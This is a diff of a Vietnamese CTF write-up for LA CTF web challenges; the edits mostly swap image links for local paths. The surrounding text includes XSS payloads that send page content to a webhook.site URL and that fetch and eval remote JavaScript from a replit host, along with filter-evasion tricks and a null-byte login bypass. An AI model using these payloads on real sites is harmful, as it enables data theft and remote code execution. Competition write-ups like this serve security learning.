@@ -19,7 +19,7 @@ Giải này mình bị skill issue nên chỉ giải được có 4 bài hic
 
 ## lucky-flag
 
-![image](https://hackmd.io/_uploads/BJDaG-AFke.png)
+![image](./images/image0.png)
 
 ### Hints 
 
@@ -29,24 +29,24 @@ No hint
 
 Challenge cho mình một trang web sau 
 
-![image](https://hackmd.io/_uploads/Sy3Yzd4Kyx.png)
+![image](./images/image1.png)
 
 Đầu tiên mình mở devtool và đọc được source như sau
 
-![image](https://hackmd.io/_uploads/S1pjzuNtkg.png)
+![image](./images/image2.png)
 
 Phân tích source : 
 
 * flag sẽ được mã hóa vào biến enc và trong các button trên chỉ có 1 button đúng mà khi mình bấm vào sẽ giải mã biến enc và trả ra cho ta flag. 
 * Khi này mình chỉ cần giải mã biến enc bằng Node JS là xong 
 
-![image](https://hackmd.io/_uploads/r1HJXdVtye.png)
+![image](./images/image3.png)
 
 `Flag : lactf{w4s_i7_luck_0r_ski11}`
 
 ## I Spy...
 
-![image](https://hackmd.io/_uploads/rJI84bRYJg.png)
+![image](./images/image4.png)
 
 ### Hints
 
@@ -56,102 +56,102 @@ Scavenger Hunt
 
 Challenge cho mình một trang web sau thuộc dạng scavenger hunt 
 
-![image](https://hackmd.io/_uploads/SJ-XLu4tyx.png)
+![image](./images/image5.png)
 
 Web cho sẵn token đầu tiên là B218B51749AB9E4C669E4B33122C8AE3
 
-![image](https://hackmd.io/_uploads/ry07LuVt1l.png)
+![image](./images/image6.png)
 
 Vì token nằm trong source nên mình mở dev tool và thấy được token tiếp theo
 
-![image](https://hackmd.io/_uploads/S1cN8OEKye.png)
+![image](./images/image7.png)
 
 Token: 66E7AEBA46293C88D484CDAB0E479268
 
-![image](https://hackmd.io/_uploads/BJr_IOVYkl.png)
+![image](./images/image8.png)
 
 Vì token nằm ở console nên mình mở tab console và thấy token 
 
-![image](https://hackmd.io/_uploads/BkkYLuEY1g.png)
+![image](./images/image9.png)
 
 Token: 5D1F98BCEE51588F6A7500C4DAEF8AD6
 
-![image](https://hackmd.io/_uploads/B1E5Lu4t1e.png)
+![image](./images/image10.png)
 
 Vì token nằm ở stylesheet nên mình xem source CSS 
 
-![image](https://hackmd.io/_uploads/rkPjLd4Y1e.png)
+![image](./images/image11.png)
 
 Token: 29D3065EFED4A6F82F2116DA1784C265
 
-![image](https://hackmd.io/_uploads/Hyw0LdNF1l.png)
+![image](./images/image12.png)
 
 Vì token nằm ở code javascript nên mình tiếp tục xem source của file js 
 
-![image](https://hackmd.io/_uploads/HyY3L_NYyx.png)
+![image](./images/image13.png)
 
 Token: 9D34859CA6FC9BB8A57DB4F444CDAE83
 
-![image](https://hackmd.io/_uploads/SkyeD_EFJx.png)
+![image](./images/image14.png)
 
 Ở đây token nằm ở header nên mình xem log trong burpsuite và thấy răng có một header X-Token có thứ mình cần tìm 
 
-![image](https://hackmd.io/_uploads/rJQ-PO4Fyl.png)
+![image](./images/image15.png)
 
 Token: BF1E1EAA5C8FDA6D9D0395B6EA075309
 
-![image](https://hackmd.io/_uploads/H1LmvuEFke.png)
+![image](./images/image16.png)
 
 Vì token nằm trong cookie nên mình tiếp tục xem log burpsuite và thấy có a-token có chứa token 
 
-![image](https://hackmd.io/_uploads/H1cVDuNYJx.png)
+![image](./images/image17.png)
 
 Token: 647E67B4A8F4AA28FAB602151F1707F2
 
 
-![image](https://hackmd.io/_uploads/r1lOw_4KJe.png)
+![image](./images/image18.png)
 
 Một nơi mà robots sẽ không được vào thì chắc chắn đó là file robots.txt
 
-![image](https://hackmd.io/_uploads/r11tP_VKJg.png)
+![image](./images/image19.png)
 
 Khi mình vào thì nó lại bị chặn bởi một file a-magical-token.txt
 
-![image](https://hackmd.io/_uploads/SJcFwdNKyl.png)
+![image](./images/image20.png)
 
 Token: 3FB4C9545A6189DE5DE446D60F82B3AF
 
-![image](https://hackmd.io/_uploads/rkjcv_EKkx.png)
+![image](./images/image21.png)
 
 Một trang mà google sẽ index trang web của mình là sitemap.xml
 
-![image](https://hackmd.io/_uploads/SkDswuEt1x.png)
+![image](./images/image22.png)
 
 Token: F1C20B637F1B78A1858A3E62B66C3799
 
-![image](https://hackmd.io/_uploads/BkDhPO4KJx.png)
+![image](./images/image23.png)
 
 Thực hiện một DELETE request thì mình có nhiều cách và mình có thể sử dụng Burpsuite
 
-![image](https://hackmd.io/_uploads/SJ9RDOVKkg.png)
+![image](./images/image24.png)
 
 Token: 32BFBAEB91EFF980842D9FA19477A42E
 
-![image](https://hackmd.io/_uploads/ryIgu_4Y1e.png)
+![image](./images/image25.png)
 
 Một bản ghi của domain nên mình sử dụng nslookup để tìm kiếm
 
-![image](https://hackmd.io/_uploads/rJrZ_uEt1e.png)
+![image](./images/image26.png)
 
 Token: 7227E8A26FC305B891065FE0A1D4B7D4
 
-![image](https://hackmd.io/_uploads/BkNf_d4Kkl.png)
+![image](./images/image27.png)
 
 `lactf{1_sp0773d_z_t0k3ns_4v3rywh3r3}`
 
 ## mavs-fan
 
-![image](https://hackmd.io/_uploads/Skn4GNAFJl.png)
+![image](./images/image28.png)
 
 ### Source
 
@@ -165,11 +165,11 @@ XSS
 
 Challenge cho mình một trang web như sau 
 
-![image](https://hackmd.io/_uploads/BJ9heoDYke.png)
+![image](./images/image29.png)
 
 Và một trang bot 
 
-![image](https://hackmd.io/_uploads/S1iB7ovFyl.png)
+![image](./images/image30.png)
 
 Sau khi đọc source của web và vì web có bot nên mình nghĩ sẽ có lỗ hổng về XSS nên mình thử payload sau 
 
@@ -179,7 +179,7 @@ Sau khi đọc source của web và vì web có bot nên mình nghĩ sẽ có l�
 
 Web chạy được cả code js mình truyền vào từ đó mình confirm có dính XSS thật
 
-![image](https://hackmd.io/_uploads/Syb8bsvYyl.png)
+![image](./images/image31.png)
 
 Tiếp theo mình lookup mục tiêu và thấy rằng endpoint /admin sẽ trả ra flag nếu ở cookie có secret là ADMIN_SECRET. 
 
@@ -202,7 +202,7 @@ Nên mình sẽ xây dựng được payload như sau
 
 Khi chạy thì ta lấy được content của page như sau 
 
-![image](https://hackmd.io/_uploads/BJyfzjvtkl.png)
+![image](./images/image32.png)
 
 Sau đó mình xây dựng payload để catch webhook như sau. Vì một số vấn đề về newline nên mình sẽ sử dụng JSON.stringify để format cái data mình nhận.
 
@@ -212,11 +212,11 @@ Sau đó mình xây dựng payload để catch webhook như sau. Vì một số 
 
 Và mình lấy được content của page
 
-![image](https://hackmd.io/_uploads/S1fGQsDYyg.png)
+![image](./images/image33.png)
 
 Submit trang web vừa nãy và mình có flag từ admin bot
 
-![image](https://hackmd.io/_uploads/S10QQswYkx.png)
+![image](./images/image34.png)
 
 `Flag: lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}`
 
@@ -232,15 +232,15 @@ XSS
 
 ### Solution 
 
-![image](https://hackmd.io/_uploads/HyTrX1TFJl.png)
+![image](./images/image35.png)
 
 Challenge cho mình một trang web như sau
 
-![image](https://hackmd.io/_uploads/SkboV0YYyg.png)
+![image](./images/image36.png)
 
 Và một trang bot
 
-![image](https://hackmd.io/_uploads/H1Z34AtFJe.png)
+![image](./images/image37.png)
 
 Source của web : 
  
@@ -400,11 +400,11 @@ Sau khi đọc source thì mình xác định được nhiệm vụ là phải v
 
 Chúng ta dến với level 0 : Ở đây trang web sẽ in ra tất cả những gì chúng ta nhập và không purify gì cả.
 
-![image](https://hackmd.io/_uploads/Sk1xSCtY1l.png)
+![image](./images/image38.png)
 
 Đầu tiên, mình thử `<script>alert(1)</script>` và mình confirm có thể chạy script trên đây. 
 
-![image](https://hackmd.io/_uploads/SyszrRYK1e.png)
+![image](./images/image39.png)
 
 
 
@@ -415,7 +415,7 @@ Chúng ta dến với level 0 : Ở đây trang web sẽ in ra tất cả nhữn
 ```
 
 
-![image](https://hackmd.io/_uploads/ryscUCYt1e.png)
+![image](./images/image40.png)
 
 Và cuối cùng ta sẽ build được một payload sau để lấy content của web
 
@@ -423,20 +423,20 @@ Và cuối cùng ta sẽ build được một payload sau để lấy content c�
 <script>fetch('https://webhook.site/e5799148-b55d-49e8-b89b-987a28176905/?c='+encodeURIComponent(document.body.innerHTML))</script>
 ```
 
-![image](https://hackmd.io/_uploads/BJq-v0Ftke.png)
+![image](./images/image41.png)
 
 Gửi cho admin để vào và ta có purell_token của level 0
 
-![image](https://hackmd.io/_uploads/BkL8D0KKkx.png)
+![image](./images/image42.png)
 
 
 
 Submit purell-token{gu4u_of_exf1l} và mình có part 1 của flag : lactf{1_4m_z3_
 
-![image](https://hackmd.io/_uploads/BJ-_DAKFkx.png)
+![image](./images/image43.png)
 
 Đến với level 1, thì mình thấy rằng trang web sẽ filter chữ script và payload không được quá 150 kí tự. 
-![image](https://hackmd.io/_uploads/rJ_pPCYF1x.png)
+![image](./images/image44.png)
 
 Vì payload của level 0 cũng không quá 150 nên mình có thể bypass bằng Script hoặc img onerror như sau
 
@@ -446,13 +446,13 @@ Vì payload của level 0 cũng không quá 150 nên mình có thể bypass bằ
 
 Khi đó ta sẽ lấy được token từ admin bot
 
-![image](https://hackmd.io/_uploads/SyaS_CYK1l.png)
+![image](./images/image45.png)
 
 Submit purell-token{scr7ptl355_m3n4c3} và mình có part 2 của flag : b3s7_x40ss_
 
 Đến level 2 web sẽ cấm giống level 1 nhưng cấm luôn cả chữ on nên mình không thể xài img onerror được nữa.
 
-![image](https://hackmd.io/_uploads/S1-_ORttJx.png)
+![image](./images/image46.png)
 
 Nhưng mình lại có thể xài Script như đã đề cập ở trên và chúng ta có payload như sau : 
 
@@ -462,17 +462,17 @@ Nhưng mình lại có thể xài Script như đã đề cập ở trên và ch�
 
 Khi đó ta sẽ lấy được token của level 2
 
-![image](https://hackmd.io/_uploads/BJ1g50tFyl.png)
+![image](./images/image47.png)
 
 Submit purell-token{XSS_IS_UNSTOPPABLE_RAHHHH} và mình có part 3 của flag : h4nd_g34m_
 
 Đến với level 3, web sẽ lowercase payload và replace các từ script và on trong payload nhưng lại không giới hạn ký tự
 
-![image](https://hackmd.io/_uploads/S1ffcCtKyx.png)
+![image](./images/image48.png)
 
 Đến đây thì mình không thể xài được Script luôn. Nhưng vi web replace nên mình có thể double lên và bypass được oonn => on. Và mình có thể tự host payload và dùng script src hoặc dùng fetch eval để chạy như sau
 
-![image](https://hackmd.io/_uploads/BJrB6RtKke.png)
+![image](./images/image49.png)
 
 Vì web không chặn samesite nên mình có thể fetch được dễ dàng
 
@@ -480,7 +480,7 @@ Vì web không chặn samesite nên mình có thể fetch được dễ dàng
 <img src=x oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(response=>response.text()).then(data=>coonnsole.log(data))" />
 ```
 
-![image](https://hackmd.io/_uploads/S1YHh0KF1l.png)
+![image](./images/image50.png)
 
 Và từ đó ta có payload sau để lấy token
 
@@ -488,19 +488,19 @@ Và từ đó ta có payload sau để lấy token
 <img src=x oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(r=>r.text()).then(data=>eval(data))" />
 ```
 
-![image](https://hackmd.io/_uploads/BkCGRAKt1g.png)
+![image](./images/image51.png)
 
 Submit purell-token{a_l7l_b7t_0f_m00t4t70n} và mình có part 4 của flag : 4cr0ss_411_t1m3
 
 Đến với level 4 ở đây web replace hết kí tự '>' dùng cho đóng tag và mình không thể double nó lên hay làm gì được. 
 
-![image](https://hackmd.io/_uploads/rJwI0AFtye.png)
+![image](./images/image52.png)
 
 Sau một hồi tìm kiếm thì mình có thể bypass bằng cách sử dụng HTML Entities 
 
 https://www.toptal.com/designers/htmlarrows/
 
-![image](https://hackmd.io/_uploads/HyH-by5K1l.png)
+![image](./images/image53.png)
 
 Từ đó ta có payload sau để lấy token
 
@@ -508,14 +508,14 @@ Từ đó ta có payload sau để lấy token
 <img src=x oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(r=&gt;r.text()).then(data=&gt;eval(data))" /
 ```
 
-![image](https://hackmd.io/_uploads/HJtc-1qYJx.png)
+![image](./images/image54.png)
 
 
 Submit purell-token{html_7s_m4lf0rmed_bu7_no7_u} và mình có part 5 của flag : _4nd_z_
 
 Tới level 5, ở đây web cấm luôn các khoảng trắng.
 
-![image](https://hackmd.io/_uploads/BkO8zk5YJg.png)
+![image](./images/image55.png)
 
 Vì thế mình chỉ cần xóa các dấu cách thừa không cần thiết và các attribute có thể dễ dàng bypass bằng dấu /
 
@@ -523,18 +523,18 @@ Vì thế mình chỉ cần xóa các dấu cách thừa không cần thiết v�
 <img/src="x"/oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(r=&gt;r.text()).then(data=&gt;eval(data))"/
 ```
 
-![image](https://hackmd.io/_uploads/HykFGJ9Yyx.png)
+![image](./images/image56.png)
 
 
 Submit purell-token{wh3n_th3_imp0st4_i5_5u5_bu7_th3r35_n0_sp4c3} và mình có part 6 của flag : un1v3rs3
 
 Tiếp đến level 6 web cấm luôn cả ( ,[, ] và )
 
-![image](https://hackmd.io/_uploads/BkR5GkqKkg.png)
+![image](./images/image57.png)
 
 Lúc này mình chỉ cần thay HTML entities như nãy là xong
 
-![image](https://hackmd.io/_uploads/H15J7ycYyx.png)
+![image](./images/image58.png)
 
 Và chúng ta có payload như sau : 
 
@@ -542,11 +542,11 @@ Và chúng ta có payload như sau :
 <img/src="x"/oonnerror="fetch&#x28;'https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js'&#x29;.then&#x28;r=&gt;r.text&#x28;&#x29;&#x29;.then&#x28;data=&gt;eval&#x28;data&#x29;&#x29;" /
 ```
 
-![image](https://hackmd.io/_uploads/rk2c7J9Ykg.png)
+![image](./images/image59.png)
 
 Submit purell-token{y0u_4r3_th3_0n3_wh0_c4ll5} và mình có part 7 của flag : _1nf3c71ng_3v34y_1}
 
-![image](https://hackmd.io/_uploads/ry-67JqFJe.png)
+![image](./images/image60.png)
 
 Và chúng ta đã vượt qua 7 level của challenge này và có flag sau : 
 
@@ -556,7 +556,7 @@ Sau đây là các bài mình làm thêm
          
 ## chessbased
 
-![image](https://hackmd.io/_uploads/By7D_V0K1e.png)
+![image](./images/image61.png)
 
 ### Source 
 
@@ -570,7 +570,7 @@ Insecure route
 
 Challenge cho mình một trang web như sau
 
-![image](https://hackmd.io/_uploads/SkaoQivYkg.png)
+![image](./images/image62.png)
 
 Và source của web 
 
@@ -633,21 +633,21 @@ app.listen(port, () => {
 
 Ở đây khi ta tìm một keyword thì web sẽ trả ra cho ta một opening tương ứng
 
-![image](https://hackmd.io/_uploads/ryVmYN0FJg.png)
+![image](./images/image63.png)
 
 Đọc lại source thì web sẽ gọi endpoint /search của backend và sau đó redirect đến /render cũng của backend. Nên mình có thể sử dụng /render để tìm opening có id từ query param.
 
-![image](https://hackmd.io/_uploads/r1WUW3wFkg.png)
+![image](./images/image64.png)
 
 Lúc này thì mình vào thẳng /render luôn vì không bị filter hasPremium và search id flag và chúng ta có flag.
 
-![image](https://hackmd.io/_uploads/Hy4rZnvF1g.png)
+![image](./images/image65.png)
 
 `Flag: lactf{t00_b4s3d_4t_ch3ss_f3_kf2}`
 
 ## cache it to win it!
 
-![image](https://hackmd.io/_uploads/Bktu1YyqJe.png)
+![image](./images/image66.png)
 
 ### Source
 
@@ -661,7 +661,7 @@ Null character bypass
 
 Challenge cho mình một trang web như sau
 
-![image](https://hackmd.io/_uploads/H1qOrlFFJg.png)
+![image](./images/image67.png)
 
 Và đây là source của trang web 
 
@@ -857,15 +857,15 @@ Sau đó server lại dùng 02C6F360a6AB4DB7b27107D62C358870 để cập nhật 
 
 * Lúc này mình mới nhận ra là nếu thêm một dấu cách ở đằng sau thì sau khi normalize cũng sẽ ra chuỗi mình cần tìm nên mình thử thêm vào và counter đã trừ xuống.
 
-![image](https://hackmd.io/_uploads/BkmgwxKtkx.png)
+![image](./images/image68.png)
 
 Ok ngon rồi thế thì chỉ cần spam 100 dấu cách là được nhưng có 1 vấn đề là nó chỉ lấy 64 kí tự đầu của chuỗi `f"GET_check_uuids:{normalize_uuid(request.args.get('uuid'))}"[:64]` nên mình chỉ spam đến 86 là ngừng rồi 
 
-![image](https://hackmd.io/_uploads/Syh8DetKyx.png)
+![image](./images/image69.png)
 
 Lúc này mình mới thử các ký tự null xem sao và wow nó trừ xuống được
 
-![image](https://hackmd.io/_uploads/Hy3OPlYFJl.png)
+![image](./images/image70.png)
 
 Từ đó mình có thể sử dụng %00 -> %20 mỗi cái 10 lần thì chắc chắn count down được từ 100 xuống 0 thôi
 
@@ -884,13 +884,13 @@ for i in range(20):
 
 Sau khi chạy thì ta có flag
 
-![image](https://hackmd.io/_uploads/Sy6cPetKyx.png)
+![image](./images/image71.png)
 
 `Flag: lactf{my_c4ch3_f41l3d!!!!!!!}`
 
 ## plinko
 
-![image](https://hackmd.io/_uploads/HJwQ45y9yg.png)
+![image](./images/image72.png)
 
 ### Source
 
@@ -904,11 +904,11 @@ Hijack Web socket
 
 Challenge cho mình một trang web sau 
 
-![image](https://hackmd.io/_uploads/BkvYEycK1l.png)
+![image](./images/image73.png)
 
 Web này mô phỏng trò chơi plinko như sau
 
-![image](https://hackmd.io/_uploads/BJ-JHJqtke.png)
+![image](./images/image74.png)
 
 Và đây là source
 
@@ -1191,11 +1191,11 @@ Phân tích :
 
 * Web sẽ sử dụng websocket để liên kết client và server và đưa các thông tin về viên bi đang rơi ở vị trí nào, vận tốc ra sao, sau đó web sẽ tính toán và render ra cho người dùng 
 
-![image](https://hackmd.io/_uploads/ByhkvJ9FJx.png)
+![image](./images/image75.png)
 
 * Ví dụ về một request socket về collision bao gồm velocity là vận tốc, position là vị trí viên bi, obsPosition là khung mà viên bi được rơi trong đó, time là thời gian rơi xuống của viên bi
 
-![image](https://hackmd.io/_uploads/rJ0-wyqKJg.png)
+![image](./images/image76.png)
 
 * Sau khi đọc source thì mình thấy khi bắt đầu game viên bi phải có tọa độ x là 500/1000 có nghĩa là ở giữa nếu không sẽ trả ra Stop cheating
 
@@ -1262,18 +1262,18 @@ Và dịch chuyển đến (0, 1000) là ta sẽ được x10 điểm
 
 Sau khi request 2 cái trên thì mình có thêm 1000 điểm
 
-![image](https://hackmd.io/_uploads/ByRY9kqYyx.png)
+![image](./images/image77.png)
 
 Thực hiện 10 lần thì ta có hơn 10000 điểm và ta có flag 
 
-![image](https://hackmd.io/_uploads/ryX7CZFYkx.png)
+![image](./images/image78.png)
 
 `Flag: lactf{mY_b4Ll_w3Nt_P1iNk_pL0Nk_4nD_n0W_1m_br0K3}`
 
 
 ## arclbroth
 
-![image](https://hackmd.io/_uploads/Bk2AKck91e.png)
+![image](./images/image79.png)
 
 ### Source
 
@@ -1287,7 +1287,7 @@ Null Byte Injection
 
 Challenge cho ta một trang web sau 
 
-![image](https://hackmd.io/_uploads/rk2Qn1cYJl.png)
+![image](./images/image80.png)
 
 Mình thử đăng nhập và web cho mình 10 con arcs 
 
@@ -1465,15 +1465,15 @@ Chúng ta có thể sử dụng username và password như sau và chèn null by
 
 Sau khi bật intercept thì mình thấy nó sẽ thêm một ký tự thoát như sau nhưng mình có thể chuyển lại thành admin\u0000 như mình mong muốn 
 
-![image](https://hackmd.io/_uploads/SyBmggcKJl.png)
+![image](./images/image81.png)
 
 Và mình đã có thể vào admin với 100 con arcs hehe
 
-![image](https://hackmd.io/_uploads/SJU4keqtke.png)
+![image](./images/image82.png)
 
 Sau khi bấm brew broth thì mình đã có flag
 
-![image](https://hackmd.io/_uploads/r14SygqKyx.png)
+![image](./images/image83.png)
 
 
 `Flag: lactf{bulri3v3_it_0r_n0t_s3cur3_sqlit3_w4s_n0t_s3cur3}`
@@ -1481,7 +1481,7 @@ Sau khi bấm brew broth thì mình đã có flag
 ## antisocial-media
 
 
-![image](https://hackmd.io/_uploads/Sy5zOEl5kg.png)
+![image](./images/image84.png)
 
 ### Source
 
@@ -1495,13 +1495,13 @@ XSS
 
 Challenge cho mình một trang web để add note như sau
 
-![image](https://hackmd.io/_uploads/B129dEeq1e.png)
+![image](./images/image85.png)
 
-![image](https://hackmd.io/_uploads/rJ3sdNe5ke.png)
+![image](./images/image86.png)
 
 Và một admin bot
 
-![image](https://hackmd.io/_uploads/rJtndNe9kx.png)
+![image](./images/image87.png)
 
 VÌ có bot nên mình nghĩ tới các lỗi XSS, CSRF, ... Nhưng sau khi thử các payload mà vẫn không ăn nên mình tiến hành đọc source
 
@@ -1699,11 +1699,11 @@ Theo như mình đọc writeup thì người ta sử dụng một cái trick c�
 
 * Hàm replace không chỉ thay đổi như mình hay sử dụng mà mình còn có thể sử dụng kiểu như regex và insert vào theo ý mình muốn như sau
 
-![image](https://hackmd.io/_uploads/HJWyh4l5yg.png)
+![image](./images/image88.png)
 
 Ví dụ : ta có thể sử dụng $\` để replace và thêm vào chuỗi đằng trước chuỗi mình cần replace và $' để thêm vào sau
 
-![image](https://hackmd.io/_uploads/Skzdn4xckg.png)
+![image](./images/image89.png)
 
 Đến đây thì mình có thể thêm một cái note như sau : 
 
@@ -1780,7 +1780,7 @@ Trong đó id là connect.sid của trang mình vừa thêm các note XSS vào. 
 
 Thực hiện đủ các bước thì ta có flag tại webhook
 
-![image](https://hackmd.io/_uploads/HkEOwSeqJg.png)
+![image](./images/image90.png)
 
 `Flag: lactf{50_50CiaL_y0u_CaN_57Ill_937_HAx0R3D}`
 
